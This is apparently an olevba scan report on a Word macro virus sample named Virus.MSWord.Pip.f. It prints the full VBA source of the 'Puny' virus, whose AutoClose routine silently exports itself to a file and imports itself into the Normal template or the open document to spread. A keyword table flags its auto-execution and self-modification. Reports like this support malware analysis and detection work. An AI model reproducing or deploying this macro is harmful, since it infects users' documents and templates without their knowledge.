olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pip.f-4341a1a99a406f45be06e7060a10a250b120aab6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Puny.bas 
in file: Virus.MSWord.Pip.f-4341a1a99a406f45be06e7060a10a250b120aab6 - OLE stream: '_VBA_PROJECT_CUR/VBA/Puny'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
    'Puny v1.00 The WaLRuS
    On Error Resume Next
    Options.SaveNormalPrompt = False
    Set N = NormalTemplate.VBProject.VBComponents: Set D = ActiveDocument.VBProject.VBComponents
If N.Item("Puny").Name <> "Puny" Then
    D("Puny").Export "c:\Puny.sys"
    Set i = NormalTemplate.VBProject
ElseIf D.Item("Puny").Name <> "Puny" Then
    N("Puny").Export "c:\Puny.sys"
    Set i = ActiveDocument.VBProject
End If
i.VBComponents.Import ("c:\Puny.sys")
ActiveDocument.Save
End Sub

-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSWord.Pip.f-4341a1a99a406f45be06e7060a10a250b120aab6 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSWord.Pip.f-4341a1a99a406f45be06e7060a10a250b120aab6 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085      9 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

